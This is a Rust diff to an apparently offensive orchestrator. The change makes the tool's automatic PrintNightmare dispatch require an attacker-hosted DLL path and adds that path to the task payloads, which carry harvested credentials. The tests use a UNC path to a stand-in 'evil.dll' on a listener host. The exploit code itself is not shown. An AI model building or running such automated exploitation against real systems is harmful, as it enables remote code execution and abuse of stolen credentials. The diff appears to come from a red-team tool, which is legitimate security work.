@@ -19,7 +19,11 @@ use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::state::*;
 
 /// Collect PrintNightmare work items from state (pure logic, no async).
-fn collect_print_nightmare_work(state: &StateInner, listener: &str) -> Vec<PrintNightmareWork> {
+fn collect_print_nightmare_work(
+    state: &StateInner,
+    listener: &str,
+    dll_path: &str,
+) -> Vec<PrintNightmareWork> {
     if state.credentials.is_empty() {
         return Vec::new();
     }
@@ -63,6 +67,7 @@ fn collect_print_nightmare_work(state: &StateInner, listener: &str) -> Vec<Print
             hostname: host.hostname.clone(),
             domain: domain.clone(),
             listener: listener.to_string(),
+            dll_path: dll_path.to_string(),
             credential: cred,
         });
     }
@@ -98,9 +103,18 @@ pub async fn auto_print_nightmare(
             None => continue, // need listener for DLL hosting
         };
 
+        // PrintNightmare requires a UNC path to a hosted malicious DLL. Without
+        // pre-staged SMB share + payload infra, dispatching is guaranteed to
+        // fail on the worker (cve_exploits.rs requires `dll_path`). Skip
+        // cleanly when not configured rather than emitting failed tasks.
+        let dll_path = match std::env::var("ARES_PRINTNIGHTMARE_DLL").ok() {
+            Some(path) if !path.is_empty() => path,
+            _ => continue,
+        };
+
         let work: Vec<PrintNightmareWork> = {
             let state = dispatcher.state.read().await;
-            collect_print_nightmare_work(&state, &listener)
+            collect_print_nightmare_work(&state, &listener, &dll_path)
         };
 
         for item in work {
@@ -110,6 +124,7 @@ pub async fn auto_print_nightmare(
                 "hostname": item.hostname,
                 "domain": item.domain,
                 "listener_ip": item.listener,
+                "dll_path": item.dll_path,
                 "credential": {
                     "username": item.credential.username,
                     "password": item.credential.password,
@@ -156,6 +171,7 @@ struct PrintNightmareWork {
     hostname: String,
     domain: String,
     listener: String,
+    dll_path: String,
     credential: ares_core::models::Credential,
 }
 
@@ -214,6 +230,7 @@ mod tests {
             "hostname": "srv01.contoso.local",
             "domain": "contoso.local",
             "listener_ip": "192.168.58.50",
+            "dll_path": "\\\\192.168.58.50\\share\\evil.dll",
             "credential": {
                 "username": cred.username,
                 "password": cred.password,
@@ -226,6 +243,7 @@ mod tests {
         assert_eq!(payload["hostname"], "srv01.contoso.local");
         assert_eq!(payload["domain"], "contoso.local");
         assert_eq!(payload["listener_ip"], "192.168.58.50");
+        assert_eq!(payload["dll_path"], "\\\\192.168.58.50\\share\\evil.dll");
         assert_eq!(payload["credential"]["username"], "admin");
         assert_eq!(payload["credential"]["password"], "P@ssw0rd!"); // pragma: allowlist secret
         assert_eq!(payload["credential"]["domain"], "contoso.local");
@@ -250,6 +268,7 @@ mod tests {
             hostname: "srv01.contoso.local".into(),
             domain: "contoso.local".into(),
             listener: "192.168.58.50".into(),
+            dll_path: "\\\\192.168.58.50\\share\\evil.dll".into(),
             credential: cred,
         };
 
@@ -313,7 +332,11 @@ mod tests {
     #[test]
     fn collect_empty_state_produces_no_work() {
         let state = StateInner::new("test".into());
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert!(work.is_empty());
     }
 
@@ -323,7 +346,11 @@ mod tests {
         state
             .hosts
             .push(make_host("192.168.58.22", "srv01.contoso.local"));
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert!(work.is_empty());
     }
 
@@ -334,12 +361,17 @@ mod tests {
             .hosts
             .push(make_host("192.168.58.22", "srv01.contoso.local"));
         state.credentials.push(make_cred("admin", "contoso.local"));
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert_eq!(work.len(), 1);
         assert_eq!(work[0].target_ip, "192.168.58.22");
         assert_eq!(work[0].hostname, "srv01.contoso.local");
         assert_eq!(work[0].domain, "contoso.local");
         assert_eq!(work[0].listener, "192.168.58.50");
+        assert_eq!(work[0].dll_path, "\\\\192.168.58.50\\share\\evil.dll");
         assert_eq!(work[0].credential.username, "admin");
     }
 
@@ -351,7 +383,11 @@ mod tests {
             .push(make_host("192.168.58.22", "srv01.contoso.local"));
         state.credentials.push(make_cred("admin", "contoso.local"));
         state.mark_processed(DEDUP_PRINTNIGHTMARE, "192.168.58.22".into());
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert!(work.is_empty());
     }
 
@@ -363,7 +399,11 @@ mod tests {
             .push(make_host("192.168.58.22", "srv01.contoso.local"));
         state.credentials.push(make_cred("admin", "contoso.local"));
         state.mark_processed(DEDUP_SECRETSDUMP, "192.168.58.22".into());
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert!(work.is_empty());
     }
 
@@ -379,7 +419,11 @@ mod tests {
         state
             .credentials
             .push(make_cred("con_user", "contoso.local"));
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert_eq!(work.len(), 1);
         assert_eq!(work[0].credential.username, "con_user");
     }
@@ -391,7 +435,11 @@ mod tests {
         state
             .credentials
             .push(make_cred("fallback", "contoso.local"));
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert_eq!(work.len(), 1);
         assert_eq!(work[0].credential.username, "fallback");
         assert_eq!(work[0].domain, "");
@@ -409,7 +457,11 @@ mod tests {
         state.credentials.push(make_cred("admin", "contoso.local"));
         // Mark second host as already secretsdumped
         state.mark_processed(DEDUP_SECRETSDUMP, "192.168.58.30".into());
-        let work = collect_print_nightmare_work(&state, "192.168.58.50");
+        let work = collect_print_nightmare_work(
+            &state,
+            "192.168.58.50",
+            "\\\\192.168.58.50\\share\\evil.dll",
+        );
         assert_eq!(work.len(), 1);
         assert_eq!(work[0].target_ip, "192.168.58.22");
     }
